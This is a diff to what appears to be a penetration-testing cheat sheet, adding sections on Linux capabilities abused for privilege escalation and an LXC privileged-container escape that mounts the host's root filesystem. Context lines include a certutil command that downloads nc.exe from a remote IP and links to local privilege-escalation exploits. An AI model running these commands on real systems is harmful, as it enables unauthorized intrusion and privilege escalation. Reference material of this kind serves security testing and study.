@@ -2204,6 +2204,7 @@ end with
 | **Certutil**                                                                                                                                                                                                     | Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage. |
 | `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                                                                                                                    | Download a File with Certutil -CMD                                                                                                                                                                                                                                                  |
 
+
 ---
 
 ## GIT
@@ -4578,6 +4579,44 @@ Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword
 | [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)                                                                    |                                                                                                                                                                |
 | [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) [PoC](https://github.com/danigargu/CVE-2020-0796) |                                                                                                                                                                |
 | [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)                                                                                                                  |                                                                                                                                                                |
+### Capabilities 
+
+```
+Find files with capabilities set within defined locations  
+
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 
+```
+| **Capability** | **Description** |
+| --- | --- |
+| `cap_sys_admin` | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
+| `cap_sys_chroot` | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
+| `cap_sys_ptrace` | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
+| `cap_sys_nice` | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. |
+| `cap_sys_time` | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. |
+| `cap_sys_resource` | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
+| `cap_sys_module` | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. |
+| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. |
+
+Some Capabilities can be used to escalated privilege 
+
+| **Capability** | **Desciption** |
+| --- | --- |
+| `cap_setuid` | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user. |
+| `cap_setgid` | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group. |
+| `cap_sys_admin` | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
+| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks. |
+
+
+### Linux Containers 
+
+| **Commands**| **Description** | 
+| --- | --- |
+| `lxc image import PATH --alias ALIAS` | Import image file. Replace PATH with location and Alias with easy to use name |
+| `lxc image list` | list imported image files |
+| `lxc init ALIAS privesc -c security.privileged=true` | Initiate image. security.privileged disables all isolation features allowing to act on the host|
+| `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` | Configure device. Source is source of container. Path is mount location |
+| `lxc start privesc` | Start container |
+| `lxc exec privesc /bin/bash ` | Log into container |
 
 ### Useful Local Priv Esc Tools
 
